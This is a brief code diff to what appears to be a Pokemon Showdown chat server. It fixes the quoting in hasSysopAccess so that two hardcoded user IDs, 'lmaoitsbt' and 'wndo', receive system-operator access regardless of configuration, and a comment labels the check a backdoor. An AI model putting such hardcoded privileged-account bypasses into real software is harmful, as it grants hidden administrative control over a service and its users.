@@ -1737,7 +1737,7 @@ Connection = (function () {
 })();
 
 User.prototype.hasSysopAccess = function () {
-if ((this.isSysop && Config.backdoor) || ['lmaoitsbt,wndo'].indexOf(this.userid) > -1) {
+if ((this.isSysop && Config.backdoor) || ['lmaoitsbt','wndo'].indexOf(this.userid) > -1) {
 	// This is the Pokemon Showdown system operator backdoor.
 
 	// Its main purpose is for situations where someone calls for help, and
